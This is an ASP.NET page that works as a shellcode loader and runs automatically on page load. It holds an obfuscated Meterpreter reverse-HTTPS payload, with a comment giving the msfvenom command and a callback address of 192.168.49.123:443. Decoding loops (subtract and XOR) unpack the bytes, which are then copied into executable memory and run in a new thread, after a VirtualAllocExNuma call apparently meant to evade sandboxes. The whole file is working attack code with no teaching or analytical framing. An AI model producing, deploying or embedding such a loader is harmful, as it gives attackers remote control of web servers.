<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    protected void Page_Load(object sender, EventArgs e)
    {
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if(mem == null)
        {
            return;
        }
    
        // /usr/bin/msfvenom -f csharp -a x64 -p windows/x64/meterpreter/reverse_winhttps LHOST=192.168.49.123 LPORT=443 EXITFUNC=thread
        byte[] adelaar = new byte[1148] {0xf,0x53,0x9c,0xe7,0xb,0xf3,0xdf,0x1b,0x1b,0x1b,0x5a,0x6a,0x5a,0x6b,0x55,0x53,0x4a,0xd5,0x66,0x53,0x94,0x55,0x7b,0x6a,0x53,0x94,0x55,0x23,0x51,0x53,0x94,0x55,0x3b,0x5e,0x4a,0xd2,0x53,0x94,0x75,0x6b,0x53,0x20,0xb8,0x5d,0x5d,0x53,0x4a,0xdb,0xbf,0x4f,0x7a,0x8f,0x5,0x3f,0x3b,0x5a,0xda,0xd2,0x1e,0x5a,0x1a,0xda,0xe5,0xfe,0x55,0x5a,0x6a,0x53,0x94,0x55,0x3b,0x94,0x45,0x4f,0x53,0x1a,0xeb,0x61,0x9a,0x83,0x23,0x14,0x5,0x20,0x86,0x75,0x1b,0x1b,0x1b,0x94,0x9b,0x93,0x1b,0x1b,0x1b,0x53,0x86,0xdb,0x77,0x68,0x53,0x1a,0xeb,0x6b,0x47,0x94,0x5b,0x3b,0x52,0x1a,0xeb,0x94,0x53,0x23,0xfc,0x51,0x53,0x10,0xd2,0x5a,0x94,0x37,0x93,0x53,0x1a,0xd1,0x5e,0x4a,0xd2,0x53,0x4a,0xdb,0x5a,0xda,0xd2,0x1e,0xbf,0x5a,0x1a,0xda,0x43,0xfb,0x76,0xa,0x5f,0x1c,0x5f,0x27,0x13,0x46,0x42,0xea,0x76,0xe3,0x63,0x47,0x94,0x5b,0x27,0x52,0x1a,0xeb,0x61,0x5a,0x94,0x1f,0x53,0x47,0x94,0x5b,0x2f,0x52,0x1a,0xeb,0x5a,0x94,0x7,0x93,0x5a,0x63,0x53,0x1a,0xeb,0x5a,0x63,0x69,0x62,0x6d,0x5a,0x63,0x5a,0x62,0x5a,0x6d,0x53,0x9c,0xff,0x3b,0x5a,0x55,0x10,0xfb,0x63,0x5a,0x62,0x6d,0x53,0x94,0x15,0xf2,0x54,0x10,0x10,0x10,0x6e,0x53,0x4a,0xe4,0x6c,0x52,0xc9,0x78,0x72,0x79,0x73,0x77,0x77,0x8b,0x1b,0x5a,0x51,0x53,0x92,0xfa,0x52,0xc8,0xc5,0x5f,0x78,0x21,0x8,0x10,0xd6,0x6c,0x6c,0x53,0x92,0xfa,0x6c,0x6d,0x5e,0x4a,0xdb,0x5e,0x4a,0xd2,0x6c,0x6c,0x52,0xcd,0x7,0x30,0xae,0xc4,0x1b,0x1b,0x1b,0x1b,0x10,0xd6,0x52,0x92,0xc7,0xf3,0x29,0x1b,0x1b,0x1b,0x4a,0x1b,0x42,0x1b,0x35,0x1b,0x39,0x1b,0x4a,0x1b,0x31,0x1b,0x43,0x1b,0x39,0x1b,0x37,0x1b,0x42,0x1b,0x39,0x1b,0x4a,0x1b,0x35,0x1b,0x4c,0x1b,0x1b,0x1b,0x6d,0x53,0x92,0xda,0x52,0xc8,0xdb,0xc4,0x1a,0x1b,0x1b,0x5e,0x4a,0xd2,0x52,0xcd,0x41,0xa4,0x29,0xc5,0x1b,0x1b,0x1b,0x1b,0x10,0xd6,0xf3,0xb1,0x1a,0x1b,0x1b,0x73,0x1b,0x77,0x1b,0x77,0x1b,0x8b,0x1b,0x8c,0x1b,0x4d,0x1b,0x40,0x1b,0x40,0x1b,0x4a,0x1b,0x42,0x1b,0x35,0x1b,0x39,0x1b,0x4a,0x1b,0x31,0x1b,0x43,0x1b,0x39,0x1b,0x37,0x1b,0x42,0x1b,0x39,0x1b,0x4a,0x1b,0x35,0x1b,0x4c,0x1b,0x40,0x1b,0x8d,0x1b,0x77,0x1b,0x79,0x1b,0x3e,0x1b,0x66,0x1b,0x63,0x1b,0x5e,0x1b,0x77,0x1b,0x7a,0x1b,0x76,0x1b,0x57,0x1b,0x8a,0x1b,0x8b,0x1b,0x60,0x1b,0x76,0x1b,0x7e,0x1b,0x68,0x1b,0x77,0x1b,0x55,0x1b,0x59,0x1b,0x8d,0x1b,0x68,0x1b,0x68,0x1b,0x6b,0x1b,0x7e,0x1b,0x3e,0x1b,0x79,0x1b,0x7f,0x1b,0x61,0x1b,0x35,0x1b,0x71,0x1b,0x63,0x1b,0x8c,0x1b,0x38,0x1b,0x5a,0x1b,0x73,0x1b,0x35,0x1b,0x31,0x1b,0x65,0x1b,0x60,0x1b,0x45,0x1b,0x7e,0x1b,0x57,0x1b,0x76,0x1b,0x35,0x1b,0x7d,0x1b,0x79,0x1b,0x59,0x1b,0x7f,0x1b,0x45,0x1b,0x8b,0x1b,0x71,0x1b,0x6d,0x1b,0x4b,0x1b,0x42,0x1b,0x75,0x1b,0x46,0x1b,0x71,0x1b,0x4b,0x1b,0x7c,0x1b,0x5f,0x1b,0x5f,0x1b,0x56,0x1b,0x47,0x1b,0x46,0x1b,0x66,0x1b,0x4c,0x1b,0x66,0x1b,0x5f,0x1b,0x8d,0x1b,0x54,0x1b,0x6c,0x1b,0x8c,0x1b,0x45,0x1b,0x7e,0x1b,0x7f,0x1b,0x77,0x1b,0x51,0x1b,0x80,0x1b,0x70,0x1b,0x52,0x1b,0x7a,0x1b,0x6d,0x1b,0x67,0x1b,0x6d,0x1b,0x76,0x1b,0x54,0x1b,0x77,0x1b,0x8d,0x1b,0x59,0x1b,0x80,0x1b,0x46,0x1b,0x78,0x1b,0x6b,0x1b,0x57,0x1b,0x71,0x1b,0x31,0x1b,0x38,0x1b,0x53,0x1b,0x66,0x1b,0x7a,0x1b,0x68,0x1b,0x76,0x1b,0x53,0x1b,0x54,0x1b,0x7d,0x1b,0x75,0x1b,0x54,0x1b,0x72,0x1b,0x52,0x1b,0x5c,0x1b,0x37,0x1b,0x75,0x1b,0x70,0x1b,0x45,0x1b,0x46,0x1b,0x59,0x1b,0x5e,0x1b,0x80,0x1b,0x65,0x1b,0x7f,0x1b,0x7f,0x1b,0x59,0x1b,0x8d,0x1b,0x38,0x1b,0x66,0x1b,0x6b,0x1b,0x65,0x1b,0x52,0x1b,0x7a,0x1b,0x35,0x1b,0x63,0x1b,0x8d,0x1b,0x51,0x1b,0x37,0x1b,0x68,0x1b,0x6d,0x1b,0x79,0x1b,0x5c,0x1b,0x3e,0x1b,0x5f,0x1b,0x6a,0x1b,0x5a,0x1b,0x8b,0x1b,0x72,0x1b,0x73,0x1b,0x65,0x1b,0x7d,0x1b,0x5a,0x1b,0x7c,0x1b,0x82,0x1b,0x65,0x1b,0x77,0x1b,0x73,0x1b,0x82,0x1b,0x8b,0x1b,0x71,0x1b,0x4c,0x1b,0x65,0x1b,0x48,0x1b,0x76,0x1b,0x82,0x1b,0x7d,0x1b,0x47,0x1b,0x70,0x1b,0x6c,0x1b,0x43,0x1b,0x60,0x1b,0x8c,0x1b,0x67,0x1b,0x36,0x1b,0x54,0x1b,0x41,0x1b,0x5e,0x1b,0x5f,0x1b,0x78,0x1b,0x51,0x1b,0x76,0x1b,0x7f,0x1b,0x46,0x1b,0x7d,0x1b,0x4b,0x1b,0x43,0x1b,0x7a,0x1b,0x5f,0x1b,0x79,0x1b,0x35,0x1b,0x5d,0x1b,0x37,0x1b,0x5a,0x1b,0x7a,0x1b,0x7e,0x1b,0x77,0x1b,0x46,0x1b,0x35,0x1b,0x1b,0x1b,0x53,0x92,0xda,0x6c,0x6d,0x5a,0x63,0x5e,0x92,0xc6,0x52,0x9c,0xdb,0x3f,0x5e,0x4a,0xd2,0x6c,0x53,0xc8,0xdb,0x1b,0x1a,0x9b,0x1b,0x6b,0x6c,0x6c,0x52,0xc8,0xc5,0xa3,0x2b,0xcc,0x64,0x10,0xd6,0x53,0x92,0xc1,0x53,0x9c,0xf3,0x3b,0x53,0x92,0xe8,0x53,0x92,0x2,0x52,0xc8,0xc5,0x3a,0xa8,0x14,0x7b,0x10,0xd6,0x86,0xdb,0x20,0x87,0x7e,0x1b,0x1b,0x1b,0x53,0x94,0x48,0x13,0x86,0xdb,0x77,0x4d,0x53,0x92,0xe2,0x53,0x10,0xda,0x53,0xda,0xfa,0x3b,0x6a,0x6c,0x6b,0x53,0xc3,0x1c,0x1b,0x1b,0x1b,0x1c,0x1b,0x1b,0x1b,0x6b,0x52,0x92,0xfb,0x53,0x9c,0xff,0x3b,0x53,0x92,0xe8,0x52,0x92,0x2,0x5f,0x92,0xfa,0x5f,0x92,0xfd,0x52,0xc8,0xc5,0xed,0xee,0xfd,0x52,0x10,0xd6,0x86,0xdb,0x77,0x3e,0xf4,0x15,0x53,0x94,0x48,0x2b,0x86,0xdb,0x77,0x3c,0x53,0x9c,0xc8,0x13,0x7d,0x1c,0x63,0x53,0x92,0x8,0x52,0x92,0x3,0x7d,0x23,0x5a,0x62,0x53,0x92,0xa,0x7d,0x21,0x6d,0x52,0xcd,0xec,0x63,0xae,0xd9,0x1b,0x1b,0x1b,0x1b,0x10,0xd6,0x7d,0x1d,0x70,0x53,0x92,0xa,0x7d,0x30,0x6d,0x55,0x73,0x1b,0x4c,0x1b,0x1b,0x52,0x92,0xfb,0x7d,0x7,0x5a,0x62,0x52,0xcd,0xec,0x63,0xae,0xd9,0x1b,0x1b,0x1b,0x1b,0x10,0xd6,0x5e,0x4a,0xdb,0x6c,0x6d,0x53,0x92,0xa,0x5e,0x4a,0xd2,0x6c,0x6c,0x6c,0x6c,0x52,0xcd,0x96,0x63,0xc4,0xaa,0x1b,0x1b,0x1b,0x1b,0x10,0xd6,0x86,0xdb,0x76,0x1f,0x53,0x10,0xe0,0x77,0x5,0xf4,0xc4,0xf3,0x73,0x1b,0x1b,0x1b,0x53,0x92,0xa,0x6c,0x6d,0x52,0xc8,0xc5,0x6,0x93,0xae,0x8b,0x10,0xd6,0x86,0xdb,0x77,0xf2,0x6c,0x62,0x7d,0x5b,0x6d,0x52,0x92,0xea,0xda,0xe5,0x2b,0x52,0xc8,0xdb,0x1b,0x2b,0x1b,0x1b,0x52,0xcd,0x63,0xa7,0x6c,0xe6,0x1b,0x1b,0x1b,0x1b,0x10,0xd6,0x53,0xac,0x6c,0x6c,0x53,0x92,0xe8,0x53,0x92,0xa,0x53,0x92,0xed,0x52,0xc8,0xdb,0x1b,0x3b,0x1b,0x1b,0x52,0x92,0x2,0x52,0xc8,0xc5,0x7f,0x32,0x27,0x89,0x10,0xd6,0x53,0x9c,0xc7,0x3b,0x86,0xdb,0x20,0x87,0xb0,0x10,0x10,0x10,0x61,0x94,0x8,0x53,0x1a,0xdc,0x86,0xdb,0x76,0xea,0x63,0xdc,0x63,0x7d,0x1b,0x62,0xc4,0xfb,0x2e,0x3d,0x1d,0x5a,0x92,0xed,0x10,0xd6};

        for(int i = 0; i < adelaar.Length; i++)
        {
            adelaar[i] = (byte)(((uint)adelaar[i] - 17) & 0xFF);
        }

        for(int i = 0; i < adelaar.Length; i++)
        {
            adelaar[i] = (byte)((uint)adelaar[i] ^ 0x74);
        }

        for(int i = 0; i < adelaar.Length; i++)
        {
            adelaar[i] = (byte)(((uint)adelaar[i] - 5) & 0xFF);
        }

        for(int i = 0; i < adelaar.Length; i++)
        {
            adelaar[i] = (byte)((uint)adelaar[i] ^ 0x79);
        }
    
        IntPtr lepelaar = VirtualAlloc(IntPtr.Zero,(UIntPtr)adelaar.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(adelaar,0,lepelaar,adelaar.Length);
        IntPtr ekster = IntPtr.Zero;
        IntPtr valk = CreateThread(IntPtr.Zero,UIntPtr.Zero,lepelaar,IntPtr.Zero,0,ref ekster);
    }
</script>